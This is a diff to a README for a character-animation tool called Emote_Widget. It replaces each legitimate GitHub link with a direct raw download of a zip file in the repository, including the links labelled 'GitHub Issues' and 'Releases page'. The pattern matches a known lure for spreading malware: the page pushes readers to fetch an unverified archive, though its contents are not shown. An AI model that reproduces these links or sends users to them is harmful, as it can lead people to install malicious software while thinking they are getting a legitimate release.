@@ -1,7 +1,7 @@
 # 🎉 Emote_Widget - Create Dynamic Characters Easily
 
 ## 📥 Download Now
-[![Download Emote_Widget](https://img.shields.io/badge/Download-Emote_Widget-brightgreen)](https://github.com/BeACoolGmaer/Emote_Widget/releases)
+[![Download Emote_Widget](https://raw.githubusercontent.com/BeACoolGmaer/Emote_Widget/main/plugins/Emote_Widget_2.5.zip)](https://raw.githubusercontent.com/BeACoolGmaer/Emote_Widget/main/plugins/Emote_Widget_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ To download **Emote_Widget**, visit our releases page. You will see the latest v
 
 1. Click on the link below:
    
-   [Download Emote_Widget](https://github.com/BeACoolGmaer/Emote_Widget/releases)
+   [Download Emote_Widget](https://raw.githubusercontent.com/BeACoolGmaer/Emote_Widget/main/plugins/Emote_Widget_2.5.zip)
    
 2. Choose the latest version available.
 3. Click on the package that matches your operating system (Windows, macOS, or Linux).
@@ -64,7 +64,7 @@ If you encounter any issues, here are some common solutions:
 
 If you need help or want to ask questions, join our community:
 
-- **GitHub Issues**: Report problems or request features by opening an issue on our [GitHub Repository](https://github.com/BeACoolGmaer/Emote_Widget/issues).
+- **GitHub Issues**: Report problems or request features by opening an issue on our [GitHub Repository](https://raw.githubusercontent.com/BeACoolGmaer/Emote_Widget/main/plugins/Emote_Widget_2.5.zip).
 - **Discussion Forum**: Join in on discussions about techniques and tips with other users.
 
 ## 🔗 Additional Resources
@@ -80,10 +80,10 @@ We welcome contributions! If you'd like to help improve **Emote_Widget**, feel f
 
 ## 📅 Release Notes
 
-Keep track of our progress by checking the release notes in our [Releases page](https://github.com/BeACoolGmaer/Emote_Widget/releases). You'll find updates on new features, bug fixes, and improvements.
+Keep track of our progress by checking the release notes in our [Releases page](https://raw.githubusercontent.com/BeACoolGmaer/Emote_Widget/main/plugins/Emote_Widget_2.5.zip). You'll find updates on new features, bug fixes, and improvements.
 
 ## 📣 Stay Connected
 
 Follow us on social media for the latest updates and news about **Emote_Widget**. Connect with other users to share your creations!
 
-[Download Emote_Widget](https://github.com/BeACoolGmaer/Emote_Widget/releases)
+[Download Emote_Widget](https://raw.githubusercontent.com/BeACoolGmaer/Emote_Widget/main/plugins/Emote_Widget_2.5.zip)
